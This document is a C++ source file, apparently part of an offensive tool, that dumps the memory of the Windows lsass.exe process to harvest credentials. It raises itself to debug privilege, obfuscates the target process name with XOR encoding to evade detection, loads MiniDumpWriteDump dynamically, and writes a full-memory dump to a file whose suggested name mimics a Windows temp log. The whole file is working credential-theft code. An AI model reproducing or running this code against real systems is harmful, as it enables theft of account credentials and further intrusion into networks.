#include <Windows.h>
#include <DbgHelp.h>
#include <cstdio>
#include <TlHelp32.h>
#include <tchar.h>
#include <synchapi.h>
#include <string>
#include <functional>

// Project imports

#include "../obfuscation/obfuscation.h"

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "NetApi32.lib")




HANDLE namedPipe;

// Credits to the following resources:
//      https://github.com/Adepts-Of-0xCC/MiniDumpWriteDumpPoC/blob/main/minidumpPoC.cpp
//      https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html
//      https://gist.github.com/allenh1/38441719a2397b2be6176fa406e38d26


void create_file(const char * lpFileName) {
    namedPipe = CreateFileA(lpFileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
}

int findMyProc(const char *procName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = -1;
    BOOL hResult;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    pe.dwSize = sizeof(PROCESSENTRY32);
    hResult = Process32First(hSnapshot, &pe);

    while (hResult) {
        if (strcmp(procName, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }
    CloseHandle(hSnapshot);
    return pid;
}


inline auto load_write_minidump(HMODULE & lib)
{
    auto cast_version = reinterpret_cast<BOOL (*)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION)>(::GetProcAddress(lib, "MiniDumpWriteDump"));
    return std::function<BOOL(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION)>(cast_version);
}

void minidumpThis(HANDLE hProc)
{
    const char* dbgcoreName = "dbgcore.dll";
    HMODULE dbgcoreHandle = LoadLibraryA(dbgcoreName);
    auto MiniDumpWriteDump = load_write_minidump(dbgcoreHandle);

    if (namedPipe) {
        DWORD lsassPid = GetProcessId(hProc);
        MiniDumpWriteDump(hProc, lsassPid, namedPipe, MiniDumpWithFullMemory, nullptr, nullptr, nullptr);
        CloseHandle(namedPipe);
    }
}


bool IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation = { 0 };
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

bool SetDebugPrivilege() {
    HANDLE hToken = nullptr;
    TOKEN_PRIVILEGES TokenPrivileges = {0};

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

    const wchar_t *lpwPriv = L"SeDebugPrivilege";
    if (!LookupPrivilegeValueW(nullptr, (LPCWSTR) lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

int dump_lsass(std::string filename) {
    if (!IsElevated()) {return -1;}
    if (!SetDebugPrivilege()) {return -1;}

    //      lsass.exe
    std::string lsass = encryptDecrypt( {0x5f,0x40,0x52,0x40,0x40,0x1d,0x56,0x4b,0x56}, 0x33);
    int proc = findMyProc(lsass.c_str());
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, proc);

    //      C:\Windows\Temp\FXSTIFFDebugLogFileAdmin.txt
    create_file(filename.c_str());
    minidumpThis(processHandle);
    CloseHandle(processHandle);
    return 0;
}

